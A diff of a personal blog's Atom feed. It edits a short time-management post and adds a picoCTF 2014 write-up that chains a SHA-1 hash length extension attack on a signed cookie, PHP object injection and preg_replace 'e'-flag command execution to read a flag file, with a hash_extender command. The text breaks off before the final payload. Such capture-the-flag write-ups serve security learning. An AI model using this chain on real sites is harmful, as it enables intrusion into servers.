@@ -2,184 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://clifford.ressel.fyi/blog</id>
     <title>Clifford Ressel Blog</title>
-    <updated>2024-01-08T00:00:00.000Z</updated>
+    <updated>2023-05-28T00:00:00.000Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://clifford.ressel.fyi/blog"/>
     <subtitle>Clifford Ressel Blog</subtitle>
-    <entry>
-        <title type="html"><![CDATA[2023 Memorable Content]]></title>
-        <id>https://clifford.ressel.fyi/blog/2023-content</id>
-        <link href="https://clifford.ressel.fyi/blog/2023-content"/>
-        <updated>2024-01-08T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[Like most overly-online folks of my generation, I read and watch and listen to a lot of content practically every day of every week.]]></summary>
-        <content type="html"><![CDATA[<p>Like most overly-online folks of my generation, I read and watch and listen to a lot of content practically every day of every week.
-Articles, blogs, podcasts, YouTube, news/debates/interviews/more.
-This was true this year, as it has been for maybe a decade now.
-This year though, I made a constant effort to collate anything that crossed the no-man's-land of mild interest,
-so I might look at a full retrospective on the select media content that got into hand-to-hand combat with existing precepts I held, or lit the path for questions I was just beginning to understand.</p>
-<p>So yes, this is just another "Best Of" list. But it's my Best Of List, and I like it quite a bit.
-So here are some of my favorite blog posts, tech talks, interviews, and other reads/listens from 2023.
-Excepting the final section, all these links are for material released in the year 2023.</p>
-<p>The most significant recurring topic pertains to software engineering and machine learning, but others include zero-day attacks, gender dynamics, free speech, and more.
-I annotated these visually as
-<span class="badge badge--primary">Software</span>,
-<span class="badge badge--info">ML</span>,
-<span class="badge badge--success">Cyber</span>,
-<span class="badge badge--warning">Gender</span>,
-<span class="badge badge--danger">Speech &amp; Media</span>, and
-<span class="badge badge--secondary">Other</span>.</p>
-<h2 class="anchor anchorWithStickyNavbar_LWe7" id="best-from-2023">Best From 2023<a href="https://clifford.ressel.fyi/blog/2023-content#best-from-2023" class="hash-link" aria-label="Direct link to Best From 2023" title="Direct link to Best From 2023">​</a></h2>
-<h3 style="margin-bottom:4px"><a href="https://discord.com/blog/how-discord-stores-trillions-of-messages" target="_blank" rel="noopener noreferrer">📝 How Discord Stores Trillions of Messages</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="https://www.boingram.com/" target="_blank" rel="noopener noreferrer">Bo Ingram</a>.
-Fantastic nitty-gritty details on scaling in production. Bonus points for the occasional dry humor!</p>
-<h3 style="margin-bottom:4px"><a href="https://blog.pragmaticengineer.com/aws-azure-and-gcp-regional-outages/" target="_blank" rel="noopener noreferrer">📝 Handling a Regional Outage: Comparing the Response From AWS, Azure and GCP</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="https://pragmaticengineer.com/" target="_blank" rel="noopener noreferrer">Gergely Orosz</a>.
-If you have any work involving cloud providers then this is an absolute must read. The final grades are not the key takeaway for me; rather it's fascinating to see the range of possible outages and responses.</p>
-<h3 style="margin-bottom:4px"><a href="https://newsletter.pragmaticengineer.com/p/measuring-developer-productivity" target="_blank" rel="noopener noreferrer">📝 Measuring developer productivity? A response to McKinsey</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="https://pragmaticengineer.com/" target="_blank" rel="noopener noreferrer">Gergely Orosz</a>.
-A better effort than any scrum discussion or blog post in order to conceptualize what work actually gets done, how do we measure it, and how does our measuring system cause feedback into the work itself.</p>
-<h3 style="margin-bottom:4px"><a href="https://dataproducts.substack.com/p/how-scale-kills-data-teams" target="_blank" rel="noopener noreferrer">📝 How Scale Kills Data Teams</a></h3>
-<p><span class="badge badge--primary">Software</span>
-<span class="badge badge--info">ML</span> by <a href="https://dataproducts.substack.com/" target="_blank" rel="noopener noreferrer">Chad Sanderson</a>.
-Data contracts are an interesting solution to a frequent, almost ever-present problem. While I still haven't gotten to apply the concept at work, this blog post gives a very relatable picture of the underlying problem.</p>
-<h3 style="margin-bottom:4px"><a href="https://shopify.engineering/shopifys-machine-learning-platform-real-time-predictions" target="_blank" rel="noopener noreferrer">📝 Unlocking Real-time Predictions with Shopify's Machine Learning Platform</a></h3>
-<p><span class="badge badge--primary">Software</span>
-<span class="badge badge--info">ML</span> by <a href="http://kazuar.github.io/" target="_blank" rel="noopener noreferrer">Isaac Vidas</a>.
-A from-the-ground-up tour of a new in-house ML platform. Interesting to me, having only worked with KubeFlow before for MLops.</p>
-<h3 style="margin-bottom:4px"><a href="https://shopify.engineering/internationalization-i18n-best-practices-front-end-developers" target="_blank" rel="noopener noreferrer">📝 Lessons From Linguistics: i18n Best Practices for Front-End Developers</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="https://www.superko.org/" target="_blank" rel="noopener noreferrer">Lucas Huang</a>.
-A simple explanation of the varying challenges for i18n, and much more approachable than reading about a full i18n/l10n solution like <a href="https://www.gnu.org/software/gettext/manual/html_node/index.html" target="_blank" rel="noopener noreferrer">GNU <code>gettext</code></a> for the first time.
-Also scratches my linguistic itch to revisit cross-language variance in syntax.</p>
-<h3 style="margin-bottom:4px"><a href="https://dangeng.github.io/visual_anagrams/" target="_blank" rel="noopener noreferrer">📝 Visual Anagrams: Generating Multi-View Optical Illusions with Diffusion Models</a></h3>
-<p><span class="badge badge--primary">Software</span>
-<span class="badge badge--info">ML</span> by Daniel Geng, Inbum Park, Andrew Owens.
-Even a quick glance is impressive, just take a look!</p>
-<h3 style="margin-bottom:4px"><a href="https://medium.com/@bobbyrsec/the-dangers-of-googles-zip-tld-5e1e675e59a5" target="_blank" rel="noopener noreferrer">📝 The Dangers of Google’s .zip TLD</a></h3>
-<p><span class="badge badge--success">Cyber</span> by <a href="https://medium.com/@bobbyrsec" target="_blank" rel="noopener noreferrer">Bobbyr</a>.
-The <code>.zip</code> domain was a controversial Twitter-storm, but this was a standalone example of the clever application to phishing attacks, and is very quick to read through and understand.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.thefp.com/p/crow-nation-battle-of-little-bighorn-reenactment" target="_blank" rel="noopener noreferrer">📝 Warriors Wanted</a> and</h3>
-<h3 style="margin-top:0px;margin-bottom:4px"><a href="https://www.thefp.com/p/the-boys-who-surf-subways" target="_blank" rel="noopener noreferrer">📝 The Boys Who Surf Subways</a></h3>
-<p><span class="badge badge--warning">Gender</span> by Olivia Reingold and McCaffrey Blauner.
-An interesting pair of articles, about problems and solutions to the quiet crisis of masculinity.
-For a deeper look at the topic, consider Richard Reeves' book, <a href="https://www.brookings.edu/books/of-boys-and-men/" target="_blank" rel="noopener noreferrer"><em>Of Boys and Men</em></a>.</p>
-<h3 style="margin-bottom:4px"><a href="https://youtube.com/watch?v=XZ3w_jec1v8F" target="_blank" rel="noopener noreferrer">📺 The Economics of Programming Languages</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="https://twitter.com/evancz" target="_blank" rel="noopener noreferrer">Evan Czaplicki</a>.
-By far my favorite tech talk of the year. Economics, PL theory, dev drama, dunking on big tech companies, Georgism, wow it's a complex and fun picture that gets woven together here.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.youtube.com/watch?v=yj-wSRJwrrc" target="_blank" rel="noopener noreferrer">📺 Pydantic is all you need</a></h3>
-<p><span class="badge badge--primary">Software</span>
-<span class="badge badge--info">ML</span> by <a href="https://jxnl.github.io/" target="_blank" rel="noopener noreferrer">Jason Liu</a>.
-This was a paradigm shift, where I now can see how LLMs are ready at the implementation level for prime-time product use (at least in low-stakes applications), with structured and reliable output.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.youtube.com/watch?v=xWoQ-E8n4B0" target="_blank" rel="noopener noreferrer">📺 Router vulnerability discovery</a> and</h3>
-<h3 style="margin-top:0px;margin-bottom:4px"><a href="https://www.youtube.com/watch?v=YCOoc1U7kPA" target="_blank" rel="noopener noreferrer">📺 exploiting for remote command execution</a></h3>
-<p><span class="badge badge--success">Cyber</span> by the <a href="https://www.flashback.sh/" target="_blank" rel="noopener noreferrer">Flashback team</a>.
-A fun whirlwind of exploit discovery and development. Do you believe that your router can be rooted just by receiving a malformed DNS request? This talk will help illustrate how, and more generally what zero-days in critical infrastructure can look like!</p>
-<h3 style="margin-bottom:4px"><a href="https://youtube.com/watch?v=tKbV6BpH-C8" target="_blank" rel="noopener noreferrer">📺 Premature Optimization</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="https://www.patreon.com/codeaesthetic" target="_blank" rel="noopener noreferrer">CodeAesthetic</a>.
-I feel this sentiment so strongly. Enough said.</p>
-<h3 style="margin-bottom:4px"><a href="https://youtube.com/watch?v=fCUkvL0mbxI" target="_blank" rel="noopener noreferrer">📺 Training Your Own AI Model</a></h3>
-<p><span class="badge badge--primary">Software</span>
-<span class="badge badge--info">ML</span> by <a href="https://www.builder.io/" target="_blank" rel="noopener noreferrer">Steve from Builder.io</a>.
-A succinct summary of when smaller, proprietary AI models can be the right choice.</p>
-<h3 style="margin-bottom:4px"><a href="https://youtube.com/live/8KgSXirtCYk?si=KsR4rFLivh4H5v1X" target="_blank" rel="noopener noreferrer">📺 Ethical Hacking: What is "Ethical?"</a></h3>
-<p><span class="badge badge--success">Cyber</span> by <a href="https://www.youtube.com/@_JohnHammond" target="_blank" rel="noopener noreferrer">John Hammond</a> and <a href="https://www.youtube.com/@LiveOverflow" target="_blank" rel="noopener noreferrer">LiverOverflow</a>.
-The cyber security community has quietly converged on healthy norms of openness and collaboration for handling exploits,
-but those boundaries always can evolve (either in response to new tech, like LLMs for phishing, or new incentives, like ransomware for financial gain).
-This long-form conversation between two experts is the type of well-informed, good-faith discussion that pushes professional norms in the right direction, and it's fun to listen in detail.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.thefp.com/p/debate" target="_blank" rel="noopener noreferrer">📺 Has the Sexual Revolution Failed?</a></h3>
-<p><span class="badge badge--warning">Gender</span> by The Free Press.
-Not an issue I'd thought about as requiring debate, but all four debaters had thought-provoking remarks to share.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.nytimes.com/2023/06/06/opinion/ezra-klein-podcast-jennifer-pahlka.html" target="_blank" rel="noopener noreferrer">🎧 The Book I Wish Every Policymaker Would Read</a></h3>
-<p><span class="badge badge--secondary">Other</span> from the Ezra Klein podcast.
-The fundamentals for why the U.S. government is currently incentivized against delivering on politically viable commitments.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.nytimes.com/2023/04/04/opinion/ezra-klein-podcast-chris-miller.html" target="_blank" rel="noopener noreferrer">🎧 The Most Amazing — and Dangerous — Technology in the World</a></h3>
-<p><span class="badge badge--secondary">Other</span> from the Ezra Klein podcast.
-Semiconductor technology is a true marvel, and the impact of the technology (as well as its unique market) now affects all sectors, from economics, to geopolitics, to AI, to industrial policy, and more.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.samharris.org/podcasts/making-sense-episodes/310-social-media-public-trust" target="_blank" rel="noopener noreferrer">🎧 Social Media &amp; Public Trust</a></h3>
-<p><span class="badge badge--danger">Speech &amp; Media</span> from the Making Sense podcast, with Sam Harris.
-A concise and from-the-source retelling of what was discovered in the Twitter Files reporting.
-Sam Harris is well-positioned as a critical (and at times, oppositional) interviewer on this topic.</p>
-<h3 style="margin-bottom:4px"><a href="https://thenetworkstate.com/episode/tobi-kaz-shopify" target="_blank" rel="noopener noreferrer">🎧 Tobi Lutke &amp; Kaz Nejatian on Shopify's Country-Sized Economy</a></h3>
-<p><span class="badge badge--secondary">Other</span> from the Network State Podcast podcast.
-A great understanding of how one of the quietest big tech companies thinks about their economic mission and impact.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.capitalisnt.com/episodes/the-private-equity-debate-revisited" target="_blank" rel="noopener noreferrer">🎧 The Private Equity Debate Revisited</a></h3>
-<p><span class="badge badge--secondary">Other</span> from the Capitalisn't podcast.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.persuasion.community/p/urban" target="_blank" rel="noopener noreferrer">🎧 Tim Urban on Everything</a></h3>
-<p><span class="badge badge--danger">Speech &amp; Media</span>
-<span class="badge badge--secondary">Other</span> from the Good Fight, with Yascha Mounk.
-Tim Urban is one of the best "explainers" of just about any topic he touches, and this interview is an interesting redux of previous topics,
-and how they fit into his recently released book, <a href="https://waitbutwhy.com/whatsourproblem" target="_blank" rel="noopener noreferrer"><em>What's Our Problem</em></a>.</p>
-<h3 style="margin-bottom:4px"><a href="https://lexfridman.com/greg-lukianoff" target="_blank" rel="noopener noreferrer">🎧 Greg Lukianoff on Cancel Culture, Deplatforming, Censorship &amp; Free Speech</a></h3>
-<p><span class="badge badge--danger">Speech &amp; Media</span> from the Lex Fridman podcast.
-FIRE has been doing critical work for decades now, and receives deserved praise for the massively increasing scope over the past few years.</p>
-<h3 style="margin-bottom:4px"><a href="https://lexfridman.com/jimmy-wales" target="_blank" rel="noopener noreferrer">🎧 Jimmy Wales on Wikipedia</a></h3>
-<p><span class="badge badge--danger">Speech &amp; Media</span> from the Lex Fridman podcast.
-Fun to hear the full perspective on how Wikipedia is run, and its evolving place in our information ecosystem.</p>
-<h3 style="margin-bottom:4px"><a href="https://mightyheaton.com/the-political-orphanage/money-doomscape-of-the-debt-apocalypse" target="_blank" rel="noopener noreferrer">🎧 Money Doomscape of the Debt Apocalypse</a></h3>
-<p><span class="badge badge--secondary">Other</span> from the Political Orphanage podcast, with Andrew Heaton.
-An earnest historical primer on how the U.S. debt has come about, and why the system is the way it is. (With a fun, if mostly unrelated, historical anecdote to kick things off!)</p>
-<h3 style="margin-bottom:4px"><a href="https://mightyheaton.com/the-political-orphanage/the-longest-happiness-study-in-history" target="_blank" rel="noopener noreferrer">🎧 The Longest Happiness Study in History</a></h3>
-<p><span class="badge badge--secondary">Other</span> from the Political Orphanage podcast, with Andrew Heaton.
-What makes humans happy? Hear from Dr. Robert Waldinger and you might know just a little bit more.</p>
-<h3 style="margin-bottom:4px"><a href="https://mightyheaton.com/the-political-orphanage/sim-city-was-always-wrong" target="_blank" rel="noopener noreferrer">🎧 Sim City Was Always Wrong</a></h3>
-<p><span class="badge badge--secondary">Other</span> from the Political Orphanage podcast, with Andrew Heaton.
-Alain Bertaud is a brilliant voice to listen to if you've ever wondered "why," about those qualities of your city that you deem esteemable or disagreeable.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.honestlypod.com/podcast/episode/81d272a5/why-men-seek-danger" target="_blank" rel="noopener noreferrer">🎧 Why Men Seek Danger</a></h3>
-<p><span class="badge badge--warning">Gender</span> from Honestly, with Bari Weiss.
-One more perspective on how we can conceive of male gender dynamics in our modern age.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.honestlypod.com/podcast/episode/27e512f3/why-65-of-fourth-graders-cant-really-read" target="_blank" rel="noopener noreferrer">🎧 Why 65% of Fourth Graders Can't Really Read</a></h3>
-<p><span class="badge badge--secondary">Other</span> from Honestly, with Bari Weiss.
-Everyone cares about literacy, because everyone deserves an on-ramp to the opportunities that depend on it.
-It is shocking and disappointing that such a critical topic has quietly been taken over with tribally-motivated thinking, and real humans have to face the consquences.</p>
-<hr>
-<h2 class="anchor anchorWithStickyNavbar_LWe7" id="older-stuff-newly-read">Older Stuff, Newly Read<a href="https://clifford.ressel.fyi/blog/2023-content#older-stuff-newly-read" class="hash-link" aria-label="Direct link to Older Stuff, Newly Read" title="Direct link to Older Stuff, Newly Read">​</a></h2>
-<p>Finally, here is some more content that might be less topical, but still interested me this year when I encountered it for the first time.</p>
-<h3 style="margin-bottom:4px"><a href="https://youtube.com/watch?v=2Ntp6BqhSng" target="_blank" rel="noopener noreferrer">📺 Are You Eating a Credit Card Every Week?</a></h3>
-<p><span class="badge badge--danger">Speech &amp; Media</span> by <a href="https://www.youtube.com/@vlogbrothers" target="_blank" rel="noopener noreferrer">vlogbrothers</a>.
-A vital reality check on how poorly our information ecosystem sometimes behaves.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.youtube.com/watch?v=8pTEmbeENF4" target="_blank" rel="noopener noreferrer">📺 The Future of Programming</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="http://worrydream.com/" target="_blank" rel="noopener noreferrer">Bret Victor</a>.
-A very fun, self-aware tour of paradigmatic assumptions deeply baked into the modern field of computer science and software engineering.</p>
-<h3 style="margin-bottom:4px"><a href="https://kinginstitute.stanford.edu/king-papers/documents/my-pilgrimage-nonviolence" target="_blank" rel="noopener noreferrer">📖 My Pilgrimage to Nonviolence</a></h3>
-<p><span class="badge badge--secondary">Other</span> by Martin Luther King Jr.
-I've reminded myself to read at least one new King essay for several years in a row now, and this one is a wonderful epistemological tour of King's thinking and influences.</p>
-<h3 style="margin-bottom:4px"><a href="https://patrickcollison.com/fast" target="_blank" rel="noopener noreferrer">📝 Fast</a></h3>
-<p><span class="badge badge--secondary">Other</span> by <a href="https://patrickcollison.com/" target="_blank" rel="noopener noreferrer">Patrick Collison</a>.
-These examples provide an important reminder for the feasibility of immediate progress.</p>
-<h3 style="margin-bottom:4px"><a href="https://journal.stuffwithstuff.com/2014/12/21/rooms-and-mazes/" target="_blank" rel="noopener noreferrer">📝 Rooms and Mazes: A Procedural Dungeon Generator</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="https://journal.stuffwithstuff.com/" target="_blank" rel="noopener noreferrer">Bob Nystrom</a>.
-Visual, fun, and oddly simple in it's apparent complexity.</p>
-<h3 style="margin-bottom:4px"><a href="https://lizengland.com/blog/2014/04/the-door-problem/" target="_blank" rel="noopener noreferrer">📝 The Door Problem</a></h3>
-<p><span class="badge badge--secondary">Other</span> by <a href="https://lizengland.com/blog/" target="_blank" rel="noopener noreferrer">Liz England</a>.
-A clear explanation for how to think about software interactions, almost like pragmatics as per linguistics.</p>
-<h3 style="margin-bottom:4px"><a href="http://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/" target="_blank" rel="noopener noreferrer">📝 The Law of Leaky Abstractions</a></h3>
-<p><span class="badge badge--primary">Software</span> by <a href="https://www.joelonsoftware.com/" target="_blank" rel="noopener noreferrer">Joel Spolsky</a>.
-Abstractions are a fundamental concept for the layers of software in every project and stack,
-and have the untold benefits of not "re-building the wheel" each time.
-But they come with consequences or limitations; as a developer I had observed many times when an abstraction was too "brittle" for certain changes,
-but Joel Spolsky puts together an even clearer picture of what it means for an abstraction to be more generally "leaky."</p>
-<h3 style="margin-bottom:4px"><a href="https://www.goodreads.com/book/show/226004.A_Deepness_in_the_Sky" target="_blank" rel="noopener noreferrer">📖 A Deepness in the Sky</a></h3>
-<p><span class="badge badge--secondary">Other</span> by Vernor Vinge.
-Vinge continues to be one of my all-time favorite authors.
-The novelty of his xenobiological and his technological descriptions together make each novel a truly unique delight.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.goodreads.com/book/show/54493401-project-hail-mary" target="_blank" rel="noopener noreferrer">📖 Project Hail Mary</a></h3>
-<p><span class="badge badge--secondary">Other</span> by Andy Weir.
-Another tale of satisfying multi-displinary competency in engineering, but even farther reaching in scope and scale than in <em>The Martian</em>.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.goodreads.com/book/show/20821053-how-adam-smith-can-change-your-life" target="_blank" rel="noopener noreferrer">📖 How Adam Smith Can Change Your Life</a></h3>
-<p><span class="badge badge--secondary">Other</span> by Russ Roberts.
-Through Adam Smith's writings and thoughts, this puts words to multiple observations I had bumped into but never had the awareness to concretely frame.
-Not as immediately applicable as some "self help" books, but it doesn't claim to be.
-Adam Smith's conception of the good life is a long term perspective I've enjoyed thinking about.</p>
-<h3 style="margin-bottom:4px"><a href="https://www.goodreads.com/book/show/25877663-babylon-s-ashes" target="_blank" rel="noopener noreferrer">📖 Babylon's Ashes</a> and</h3>
-<h3 style="margin-top:0px;margin-bottom:4px"><a href="https://www.goodreads.com/book/show/28335696-persepolis-rising" target="_blank" rel="noopener noreferrer">📖 Persepolis Rising</a> and</h3>
-<h3 style="margin-top:0px;margin-bottom:4px"><a href="https://www.goodreads.com/book/show/28335698-tiamat-s-wrath" target="_blank" rel="noopener noreferrer">📖 Tiamat's Wrath</a></h3>
-<p><span class="badge badge--secondary">Other</span> by James S.A. Corey.
-Space Opera go boom <!-- -->:D<!-- --> But in seriousness, The Expanse has not disappointed as the series draws to its conclusion.
-It has far outgrown the "Game-of-Thrones-in-space" comparison, and deservedly now defines its own scifi lodestone with the carefully-grounded technology and interstellar world building, the beautiful multi-plotline tension built into every book's climax, and the finally unveiling plot destination for the series.</p>]]></content>
-        <author>
-            <name>Clifford</name>
-            <uri>https://github.com/CSRessel</uri>
-        </author>
-    </entry>
     <entry>
         <title type="html"><![CDATA[10 minute moments]]></title>
         <id>https://clifford.ressel.fyi/blog/many-minutes-few-moments</id>
@@ -190,27 +16,145 @@ It has far outgrown the "Game-of-Thrones-in-space" comparison, and deservedly no
 <p>16 waking hours ÷ 10 minutes = 96</p>
 <p>10 minutes is ~1% of your day.</p>
 </blockquote>
-<p>- <a href="https://taylor.town/10-minutes" target="_blank" rel="noopener noreferrer">by Taylor Troesh</a></p>
-<p>When the phone scrolling lasts for 10 minutes, or low-priority yak shaving tasks draw your attention for 10 minutes, that's one percent of your day spent.
-That's not necessarily a bad thing or a good thing, but make sure it's a thing you want to spend one percent of your day on.</p>
-<p>You only have this many of those 10 minute moments.</p>
-<pre style="width:min-content"><p>🥱  📱  🍳  🥐  📱  ☕
-🪥  🧥  💻  💻  💻  🚽
+<p>- <a href="https://taylor.town/10-minutes" target="_blank" rel="noopener noreferrer">credit to Taylor Troesh</a></p>
+<p>When the phone scrolling lasts for 10 minutes, or low-priority yak shaving adds up to 10 minutes, that's one percent of your day spent.
+That's not necessarily a bad thing or a good thing, but make sure it's a thing you want to have spent one percent of your day on.</p>
+<p>You only have this many 10 minute moments.</p>
+<pre style="width:min-content"><p>🥱  📱  🪥  🍳  🥐  📱
+☕  🧥  💻  💻  💻  🚽
 💬  📧  🎧  💻  📞  💻
 💻  💻  💻  💻  ☕  💻
 📞  💻  📱  🎧  💻  💻
 💬  💻  📱  🍱  🍱  📱
 ☕  💻  📞  💻  💻  🎧
-🚽  📱  💻  💻  📧  📞
-📞  💻  💻  📱  🥪  💻
-💻  💬  💬  📱  💻  🚗
+🚽  📱  💻  💻  📧  💻
+💻  💻  💻  💻  💻  💻
+💻  💬  🥪  📱  💻  🚗
 🛒  🛒  🚗  🥏  🥏  🏃
 🏃  🥏  🥏  🥏  🏋️  🏋️
 🏋️  🏋️  🧘  🧘  🚗  🚗
 🛁  🍲  🍲  📺  📺  📱
-📱  📺  🚽  💻  💻  💻
+📺  💻  🚽  💻  💻  💻
 🪥  📖  📖  📖  📖  🛌</p></pre>
 <p>Many minutes, but few moments.</p>]]></content>
+        <author>
+            <name>Clifford</name>
+            <uri>https://github.com/CSRessel</uri>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[picoCTF 2014 part 3: Steve's List]]></title>
+        <id>https://clifford.ressel.fyi/blog/picoctf-2014-part3</id>
+        <link href="https://clifford.ressel.fyi/blog/picoctf-2014-part3"/>
+        <updated>2014-12-01T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Summary]]></summary>
+        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
+<p>Hash extension allows us to enter whatever cookies we choose, without knowledge of the secret, and still pass the website’s checks. Since the cookie is unserialized, we can inject arbitrary php objects into the server. By injecting a Post object, we know it’s destroy method will be called. This method has been redefined to output the Post’s fields in HTML comments after parsing them with the class Filter. The Filter operates by running the given text through preg_replace calls with stored params for match and substitution. As we have injected the object, we have complete control over these stored params, and can thus call the preg_replace with the ‘e’ flag, allowing us to do arbitrary command execution. By catting the necessary file at <code>/home/daedalus/flag.txt</code>, and substituting all of the Post’s text with the file’s contents, we can print the file’s contents in an HTML comment, and thus get the flag.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-hash-extension">The Hash Extension<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#the-hash-extension" class="hash-link" aria-label="Direct link to The Hash Extension" title="Direct link to The Hash Extension">​</a></h2>
+<p>Examination of the hacked website shows the only possible input is through the cookies.
+However, any attempts to manipulate the cooke result in us being locked out of the website.</p>
+<p>Examination of the website source makes it quickly apparent why:</p>
+<div class="language-PHP language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$custom_settings = urldecode($_COOKIE['custom_settings']);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$hash = sha1(AUTH_SECRET . $custom_settings);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">if ($hash !== $_COOKIE['custom_settings_hash']) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  die("Why would you hack Section Chief Steve's site? :(");</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>The cookie <code>custom_settings</code> will later be deserialized, and will be the site of our object inject. However, <code>custom_settings_hash</code> will need to change in a similar manner.</p>
+<p>To not fail the validation, <code>custom_settings_hash</code> needs to be of the form <code>sha1(AUTH_SECRET . urldecode($_COOKIE['custom_settings']))</code> where <code>AUTH_SECRET</code> is an unknown, eight letter secret.
+As we do not have access to <code>AUTH_SECRET</code>, it would appear that we are unable to change the <code>custom_settings</code> cookie.</p>
+<p>However, using a hash extension attack, we can change the value of <code>custom_settings_hash</code> to correspond to our new value of <code>custom_settings</code> without knowledge of the <code>AUTH_SECRET</code>.</p>
+<p>The tool to be used is called <a href="https://github.com/iagox86/hash_extender">hash extender</a>. By downloading and compiling the program, we can generate the new value of <code>custom_settings_hash</code> with the following command:</p>
+<div class="language-Shell language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ./hash_extender --data d --secret 8 --append a --signature s --format sha1 --table</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>where <code>d</code> is the previous <code>custom_settings</code>, <code>a</code> is the addition to the <code>custom_settings</code> (or the object injection), and s is the previous value of <code>custom_settings_hash</code>.</p>
+<p>With this value, we can now manipulate <code>custom_settings</code> without tripping Steve’s rudimentary IPS.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-object-injection">The Object Injection<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#the-object-injection" class="hash-link" aria-label="Direct link to The Object Injection" title="Direct link to The Object Injection">​</a></h2>
+<p>There are several important items to notice while reading the source of the website.</p>
+<ol>
+<li>Whatever is in the <code>custom_settings</code> cookie will be unserialized. Specifically, the contents will be split on newlines, and each section will be individually unserialized.</li>
+<li>In the <code>classes.php</code> file, the Post’s <code>__destruct()</code> method is redefined. It now is intended to output the Post’s fields in comments, as “debugging stuff.”</li>
+<li>The Filter class used by the Post’s <code>__destruct()</code> method uses the <code>preg_replace()</code> method with class fields as arguments.</li>
+</ol>
+<p>These three facts, taken together, allow us to do arbitrary command execution with viewing of output by injecting objects into the <code>custom_settings</code> cookie.</p>
+<p>The necessary object to cat the flag from <code>/home/daedalus/flag.txt</code> will look something like this in PHP:</p>
